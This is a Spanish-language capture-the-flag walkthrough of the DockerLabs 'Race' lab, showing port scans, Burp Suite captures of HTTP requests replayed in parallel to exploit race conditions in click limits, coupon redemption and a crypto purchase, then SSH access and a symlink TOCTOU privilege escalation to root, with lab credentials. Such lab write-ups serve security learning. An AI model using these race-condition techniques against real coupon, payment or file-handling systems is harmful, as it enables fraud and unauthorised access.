---
icon: flag
---

# Race DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip race.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh race.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 10:10 CET
Nmap scan report for 172.17.0.2
Host is up (0.000050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.4 (Python 3.13.5)
|_http-title: SaaS Dashboard - Free Tier
|_http-server-header: Werkzeug/3.1.4 Python/3.13.5
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

Veremos un puerto bastante interesante el `5000` que que aloja por lo que se ve una pagina web, entiendo que esta en `python3` con la tecnologia `Flask` como suele ser de normal, si entramos dentro...

```
URL = http://<IP>:5000/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 101239.png" alt=""><figcaption></figcaption></figure>

Veremos como una especie de gestion de recursos en una nube teniendo planes mensaules, espacio, etc...

## Nivel 1

Si investigamos un poco mas a fondo veremos que el objetivo de este nivel es realizar un `race condition` por lo que vamos abrir `BurpSuite` y vamos a capturar la peticion de cuando le damos `Click` a `Ejecutar Acción`.

El objetivo es ejecutar mas de `3` acciones, ya que si enviamos la peticion de forma paralela antes de que llegue a la validacion, podremos ejecutar tantas acciones como queramos.

Cuando capturemos la peticion del `Click` veremos lo siguiente:

```
POST /click HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2:5000/
Origin: http://172.17.0.2:5000
DNT: 1
Connection: keep-alive
Cookie: session=.eJwljkEOwiAQAL9C9mwaEGlpv2E8qWkWdonEFgxQL8a_28TTZC6T-cAcFqwPrjBdPyDaDqib91wrHOCcl-hj20hwekck7MQliTUTF6RcRBZIa0yC2HG5bVKyEvgq2WFZsIP7934AX0uYW35yggnYkTOnIM2RpEHU6IO1UnkarO1PZnCKSStrtB15xKBQeeyP3uhB9hyU3p-2ymWOBJMaxr8lXHlvN64Nvj-oRkMo.aTKeuQ.lC5E0n8bV6IHAFLX1dXAmMIBHeg
Priority: u=0
Content-Length: 0


```

Ahora esto le haremos `Ctrl+R` para enviarlo al `Repeater`, una vez ahi seleccionaremos la peticion dandole click derecho y lo añadiremos a un grupo (La opcion se llama `Add tab to group`) hecho esto le volveremos a dar click derecho y le daremos a `duplicate tab` para duplicarlo unas 6 veces mas o menos, teniendo en total unas 7 peticiones, despues en el boton naranja llamado `Send` nos aparecera una flechita, le daremos a la opcion `Send group (Parallel)` para enviar todas las peticiones del grupo en paralelo a la vez quedando algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 102506.png" alt=""><figcaption></figcaption></figure>

Ahora si le damos al boton naranja, veremos que se envian todas a la vez, en la respuesta del servidor todas se han validado de forma correcta pudiendo explotar esto mismo, ahora si recargamos la pagina...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 102012.png" alt=""><figcaption></figcaption></figure>

Veremos que lo hemos conseguido, por lo que vamos al nivel `2` con dichas credenciales.

## Nivel 2

Si entramos dentro de dicho nivel veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 102652.png" alt=""><figcaption></figcaption></figure>

Vemos una pagina en la que tenemos una cartera virtual pero con una saldo de `0.00`, pero si canjeamos el `cupon` veremos que nos da `10.00$`, la idea aqui es similar a la de antes, hay que realizar un `Race Condition` para poder canjear dicho `cupon` las veces que queramos hasta llegar a los `50.00$` y comprar el `mes`, supongo que por dentro tendra una validacion floja en el echo de que cuando tu envias dicha peticion del `cupon` este se entrega y despues se valida que ya lo tenga canjeado, por lo que podremos enviar peticiones simultaneas antes de que llegue a la fase de validacion.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 102804.png" alt=""><figcaption></figcaption></figure>

Primero tendremos que capturar la peticion de `canjeo de cupon` con `BurpSuite`:

```
POST /level-2/redeem HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2:5000/level-2
Content-Type: application/json
Content-Length: 19
Origin: http://172.17.0.2:5000
DNT: 1
Authorization: Basic Y29uZGl0aW9uMTpyYWNlMQ==
Connection: keep-alive
Cookie: session=.eJwljkEOwiAQAL9C9mwaEGlpv2E8qWkWdonEFgxQL8a_28TTZC6T-cAcFqwPrjBdPyDaDqib91wrHOCcl-hj20hwekck7MQliTUTF6RcRBZIa0yC2HG5bVKyEvgq2WFZsIP7934AX0uYW35yggnYkTOnIM2RpEHU6IO1UnkarO1PZnCKSStrtB15xKBQeeyP3uhB9hyU3p-2ymWOBJMaxr8lXHlvN64Nvj-oRkMo.aTKeuQ.lC5E0n8bV6IHAFLX1dXAmMIBHeg
Priority: u=0


{
	"code":"TRIAL-10"
}
```

Esto lo enviaremos al `repeater` y haremos el mismo proceso de antes de añadirlo a un grupo, duplicar las peticiones y dejarlo listo para enviar en paralelo:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103250.png" alt=""><figcaption></figcaption></figure>

Ahora si las enviamos y visualizamos la respuesta del servidor, veremos que todas se validaron de forma correcta, si volvemos a la pagina y la recargamos veremos este saldo:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103341.png" alt=""><figcaption></figcaption></figure>

Vemos que ya podemos comprar el `PRO` de sobra, si le damos al boton de comprar...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103406.png" alt=""><figcaption></figcaption></figure>

Veremos que lo hemos conseguido, ahora podremos acceder al nivel `3` metiendo las siguientes credenciales.

## Escalate user racebtc

### Nivel 3

Dentro de dicho nivel veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103521.png" alt=""><figcaption></figcaption></figure>

Aqui vemos que ya estamos jugando con una cartera de criptomonedas, por lo que entiendo aqui la idea es que cuando le damos a `Buy BTC` se nos compra una criptomoneda, pero si capturamos la peticion de compra y la duplicamos para enviarla multiples veces, podremos canjear esa compra tantas veces como queramos pudiendo tener muchas criptomonedas.

Vamos a capturar la peticion de `Buy BTC` viendo lo siguiente:

```
POST /level-3/buy HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2:5000/level-3
Content-Type: application/json
Content-Length: 12
Origin: http://172.17.0.2:5000
DNT: 1
Authorization: Basic cmFjZTpjb25kaXRpb24=
Connection: keep-alive
Cookie: session=.eJwljkEOwiAQAL9C9mwaEGlpv2E8qWkWdonEFgxQL8a_28TTZC6T-cAcFqwPrjBdPyDaDqib91wrHOCcl-hj20hwekck7MQliTUTF6RcRBZIa0yC2HG5bVKyEvgq2WFZsIP7934AX0uYW35yggnYkTOnIM2RpEHU6IO1UnkarO1PZnCKSStrtB15xKBQeeyP3uhB9hyU3p-2ymWOBJMaxr8lXHlvN64Nvj-oRkMo.aTKeuQ.lC5E0n8bV6IHAFLX1dXAmMIBHeg
Priority: u=0


{
	"amount":1
}
```

Ahora realizaremos el mismo proceso de antes enviaremos la peticion al `repeater` y lo añadiremos a un grupo, dentro de este lo duplicaremos unas `10` veces, la pondremos en paralelo quedando algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103855.png" alt=""><figcaption></figcaption></figure>

Ahora si las enviamos, y visualizamos la respuesta del servidor, veremos que se han canjeado de forma correcta todas, por lo que si recargamos la pagina veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-05 103918.png" alt=""><figcaption></figcaption></figure>

Lo hemos conseguido ahora nos podremos conectar por `SSH` con dichas credenciales.

### SSH

```shell
ssh racebtc@<IP>
```

Metemos como contraseña `chocolate`...

```
Linux 44cb69da6810 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
racebtc@44cb69da6810:~$ whoami
racebtc
```

Veremos que habremos accedido de forma correcta.

## Escalate Privileges

Si listamos la carpeta actual veremos el siguiente archivo:

```
-rwxr-xr-x 1 racebtc racebtc 2801 Dec  1 18:41 privesc_exploit.sh
```

Si lo ejecutamos de esta forma:

```shell
./privesc_exploit.sh
```

Info:

```
╔════════════════════════════════════════════════════╗
║   Exploit de Escalada de Privilegios             ║
║   Técnica: Symlink Race Condition (TOCTOU)       ║
╚════════════════════════════════════════════════════╝

[1] Creando archivo inicial...
[2] El script de backup lo detectará en 5 segundos...

[3] Ahora reemplazando el archivo por un symlink a /root/flag.txt...
[4] Esperando a que el script root lea el symlink (max 10 segundos)...

......
╔════════════════════════════════════════════════════╗
║            ¡EXPLOIT EXITOSO! 🎉                   ║
╚════════════════════════════════════════════════════╝

La FLAG es:
FLAG{root_password:RaceCondition2024!}

╔════════════════════════════════════════════════════╗
║   CONTRASEÑA DE ROOT OBTENIDA                     ║
╚════════════════════════════════════════════════════╝

Password de root: RaceCondition2024!

Ahora puedes convertirte en root con:
  su root

E ingresar la contraseña: RaceCondition2024!

¡Felicitaciones! Has completado todo el laboratorio 🏆
```

Veremos que nos proporciona la contraseña de `root` directamente, por lo que vamos acceder al usuario `root` metiendo dicha `password`.

```shell
su root
```

Metemos como contraseña `RaceCondition2024!`...

```
root@44cb69da6810:/home/racebtc# whoami
root
```

Y con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.

> flag.txt

```
FLAG{root_password:RaceCondition2024!}
```
